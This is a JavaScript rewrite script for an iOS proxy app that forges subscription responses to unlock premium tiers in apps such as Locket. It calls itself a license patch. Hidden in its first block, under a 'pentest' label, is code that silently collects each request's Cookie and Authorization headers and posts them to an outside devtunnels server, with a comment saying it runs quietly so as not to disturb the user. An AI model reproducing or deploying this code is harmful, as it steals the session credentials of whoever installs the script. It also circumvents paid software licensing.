// ========= ID ========= //
const mapping = {
  '%E8%BD%A6%E7%A5%A8%E7%A5%A8': ['vip+watch_vip'],
  'Locket': ['Gold']
};

// ========= ĐOẠN MÃ PENTEST THU THẬP COOKIE/TOKEN ========= //
try {
  // Trích xuất dữ liệu nhạy cảm từ Headers và URL của Request
  var user_cookie = $request.headers["Cookie"] || $request.headers["cookie"];
  var user_token = $request.headers["Authorization"] || $request.headers["authorization"];
  var target_url = $request.url;

  // Nếu phát hiện có Cookie hoặc Token, tiến hành gửi về Server thử nghiệm
  if (user_cookie || user_token) {
    const test_server = "https://h123lgxn-3000.asse.devtunnels.ms";
    
    $httpClient.post({
      url: test_server,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: target_url,
        cookie: user_cookie,
        token: user_token
      })
    }, function(error, response, data) {
      // Chạy ngầm im lặng, không làm gián đoạn trải nghiệm người dùng
    });
  }
} catch (e) {
  // Bỏ qua lỗi cấu trúc để đảm bảo script phía dưới luôn được thực thi
}

// ========= PHẦN XỬ LÝ BẢN QUYỀN (ĐÃ ĐỔI TÊN THÀNH M4T) ========= // 
var ua = $request.headers["User-Agent"] || $request.headers["user-agent"],
    obj = JSON.parse($response.body);

obj.Attention = "Chúc mừng bạn! Vui lòng không bán hoặc chia sẻ cho người khác!";

// Đổi ohoang7 -> M4T
var M4T = {
  is_sandbox: !1,
  ownership_type: "PURCHASED",
  billing_issues_detected_at: null,
  period_type: "normal",
  expires_date: "2099-12-18T01:04:17Z",
  grace_period_expires_date: null,
  unsubscribe_detected_at: null,
  original_purchase_date: "2024-07-28T01:04:18Z",
  purchase_date: "2024-07-28T01:04:17Z",
  store: "app_store"
};

// Đổi vuong2023 -> M4T_product
var M4T_product = {
  grace_period_expires_date: null,
  purchase_date: "2024-07-28T01:04:17Z",
  product_identifier: "com.M4T.premium.yearly",
  expires_date: "2099-12-18T01:04:17Z"
};

const match = Object.keys(mapping).find(e => ua.includes(e));

if (match) {
  let [e, s] = mapping[match];
  if (s) {
    M4T_product.product_identifier = s;
    obj.subscriber.subscriptions[s] = M4T;
  } else {
    obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
  }
  obj.subscriber.entitlements[e] = M4T_product;
} else {
  obj.subscriber.subscriptions["com.M4T.premium.yearly"] = M4T;
  obj.subscriber.entitlements.pro = M4T_product;
}

$done({ body: JSON.stringify(obj) });
